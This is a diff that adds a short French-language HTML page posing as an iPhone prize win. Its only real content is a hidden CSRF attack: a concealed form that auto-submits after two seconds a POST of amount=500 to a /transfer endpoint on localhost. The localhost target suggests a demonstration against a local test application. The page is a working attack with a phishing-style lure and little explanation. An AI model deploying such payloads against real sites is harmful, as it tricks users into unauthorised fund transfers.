@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gagnez un iPhone!</title>
+</head>
+<body>
+    <h1>🎉Félicitations! Vous avez gagné un iPhone!</h1>
+    <p>Cliquez pour réclamer votre prix:</p>
+    
+    <!-- Attaque CSRF cachée -->
+    <form id="csrfForm" action="http://localhost:8080/transfer" method="POST">
+        <input type="hidden" name="amount" value="500">
+    </form>
+    
+    <script>
+        // Soumettre automatiquement le formulaire
+        setTimeout(() => {
+            document.getElementById('csrfForm').submit();
+        }, 2000);
+    </script>
+</body>
+</html>
